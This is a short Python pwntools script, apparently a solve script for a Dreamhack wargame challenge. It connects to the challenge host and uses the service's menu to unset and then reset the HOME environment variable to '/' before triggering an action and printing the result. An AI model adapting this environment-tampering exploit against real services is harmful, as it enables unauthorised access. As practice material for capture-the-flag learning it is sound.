from pwn import *

port = 18749
rem = remote("host3.dreamhack.games", port)

rem.sendlineafter(b'> ', b'2')
rem.sendlineafter(b'name: ', b'HOME')

rem.sendlineafter(b'> ', b'1')
rem.sendlineafter(b'name: ', b'HOME')
rem.sendlineafter(b'value: ', b'/')

rem.sendlineafter(b'> ', b'3')

print(rem.recvline())